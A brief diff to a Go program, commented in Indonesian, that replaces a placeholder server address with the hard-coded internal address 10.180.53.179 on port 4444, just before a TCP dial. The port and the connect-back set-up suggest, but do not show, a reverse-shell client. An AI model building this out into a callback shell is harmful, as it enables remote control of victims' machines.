@@ -12,7 +12,7 @@ import (
 func main() {
 	// --- Konfigurasi Koneksi ---
 	// Ganti dengan IP dan Port server Anda
-	serverAddr := "IP_SERVER_GO:4444"
+	serverAddr := "10.180.53.179:4444"
 
 	// --- Terhubung ke Server ---
 	conn, err := net.Dial("tcp", serverAddr)
